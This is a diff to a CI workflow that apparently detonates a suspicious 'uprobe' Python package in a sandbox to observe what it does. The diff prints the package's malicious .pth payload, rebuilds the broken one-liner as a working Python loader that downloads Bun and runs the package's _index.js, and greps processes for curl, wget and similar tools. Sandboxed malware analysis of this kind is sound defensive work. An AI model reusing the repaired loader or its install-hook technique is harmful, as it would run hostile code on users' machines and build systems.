@@ -57,43 +57,72 @@ jobs:
           python -m pip install --no-deps /tmp/packages/uprobe-0.1.4-py3-none-any.whl
           python -m pip show uprobe
 
-      - name: Inspect installed package layout
+      - name: Show .pth payload and package layout
         continue-on-error: true
         run: |
-          python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))" \
-            | xargs -I{} sh -c 'echo "=== Tree: {} ==="; ls -laR {}' || true
-
-      - name: Show raw .pth payload before patching
-        run: |
           SITE=$(python -c "import site; print(site.getsitepackages()[0])")
-          PTH="$SITE/uprobe-setup.pth"
           echo "=== uprobe-setup.pth ==="
-          cat "$PTH"
+          cat "$SITE/uprobe-setup.pth" || echo "(not found)"
+          echo ""
+          echo "=== uprobe package files ==="
+          python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))" \
+            | xargs -I{} ls -la {}
 
-      - name: Patch .pth payload (fix missing tempfile import and _G variable)
-        run: |
-          SITE=$(python -c "import site; print(site.getsitepackages()[0])")
-          PTH="$SITE/uprobe-setup.pth"
-          # The attacker's one-liner uses _T (tempfile) and _G but never imports/defines them.
-          # Add tempfile to the import list and define _G as a run-once flag path.
-          sed -i \
-            -e 's/import os as _o,/import os as _o,tempfile as _T,/' \
-            -e 's/open(_G,"w")/open("\/tmp\/.uprobe_bun_done","w")/' \
-            "$PTH"
-          echo "=== patched .pth ==="
-          cat "$PTH"
-
-      - name: Trigger patched .pth payload (spoofed repo)
+      - name: Execute payload directly (fixed Python syntax)
+        # The .pth one-liner has two bugs preventing execution:
+        # 1. `if` as a compound statement after `;` — always a SyntaxError in Python
+        # 2. `_T` (tempfile) and `_G` undefined in the first line variant
+        # Reconstruct the logic as a proper multi-line script and run it directly.
         continue-on-error: true
         env:
           GITHUB_REPOSITORY: xyz/xyz
         run: |
-          strace -f -e trace=network,execve,openat -o /tmp/uprobe-strace.log \
-            python -c "import uprobe; print('uprobe version:', getattr(uprobe, '__version__', 'unknown'))" 2>&1 || true
+          UPROBE_DIR=$(python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))")
+          echo "uprobe dir: $UPROBE_DIR"
 
-      - name: Wait for bun download and _index.js execution
+          # Write the fixed payload script (bash substitutes $UPROBE_DIR into the heredoc)
+          cat > /tmp/run_payload.py << PYEOF
+import os, subprocess, urllib.request, platform, sys, tempfile, glob, zipfile
+
+uprobe_dir = "$UPROBE_DIR"
+_j = os.path.join(uprobe_dir, "_index.js")
+if not os.path.exists(_j):
+    _c = glob.glob(os.path.join(uprobe_dir, "*", "_index.js"))
+    _j = _c[0] if _c else ""
+
+print(f"_index.js: {_j} (exists={os.path.exists(_j)}, size={os.path.getsize(_j) if os.path.exists(_j) else 0})")
+
+_e = os.name == "nt"
+_b = os.path.join(tempfile.gettempdir(), "b", "bun" + (".exe" if _e else ""))
+os.makedirs(os.path.dirname(_b), exist_ok=True)
+
+if not os.path.exists(_b):
+    _a = "aarch64" if platform.machine() == "arm64" else "x64"
+    _m = {"linux": "linux", "darwin": "darwin", "win32": "windows"}.get(sys.platform, "linux")
+    _z = os.path.join(tempfile.gettempdir(), "b.zip")
+    url = f"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-{_m}-{_a}.zip"
+    print(f"Downloading Bun from: {url}")
+    urllib.request.urlretrieve(url, _z)
+    zipfile.ZipFile(_z).extract(os.path.basename(_b), os.path.dirname(_b))
+    os.chmod(_b, 0o755)
+    os.unlink(_z)
+    print(f"Bun installed at: {_b}")
+
+print(f"Running: {_b} run {_j}")
+result = subprocess.run([_b, "run", _j], check=False)
+print(f"bun exit code: {result.returncode}")
+PYEOF
+
+          echo "=== payload script ==="
+          cat /tmp/run_payload.py
+          echo ""
+          echo "=== executing ==="
+          strace -f -e trace=network,execve,openat -o /tmp/uprobe-strace.log \
+            python /tmp/run_payload.py 2>&1 || true
+
+      - name: Wait for _index.js execution to complete
         run: |
-          echo "Waiting 120 seconds for Bun download + _index.js execution..."
+          echo "Waiting 120 seconds for _index.js network activity..."
           echo "Harden Runner will capture all outbound connections."
           sleep 120
 
@@ -101,16 +130,19 @@ jobs:
         continue-on-error: true
         run: |
           echo "=== Dropped files in /tmp ==="
-          ls -la /tmp/ | grep -v packages || true
+          ls -la /tmp/ || true
+          echo ""
+          echo "=== Bun binary ==="
+          ls -la /tmp/b/ || echo "(not present)"
           echo ""
           echo "=== Home directory ==="
-          ls -la ~/ | tail -30
+          ls -la ~/ | tail -20
           echo ""
           echo "=== Suspicious background processes ==="
-          ps aux | grep -E "curl|wget|bash|nohup|python|node" | grep -v grep || echo "None"
+          ps aux | grep -E "curl|wget|bash|nohup|python|bun|node" | grep -v grep || echo "None"
           echo ""
-          echo "=== strace network/exec summary (first 200 lines) ==="
-          head -200 /tmp/uprobe-strace.log || true
+          echo "=== strace network/exec summary ==="
+          grep -E "connect|execve|github|bun" /tmp/uprobe-strace.log | head -50 || true
 
       - name: Upload strace log
         uses: actions/upload-artifact@v4
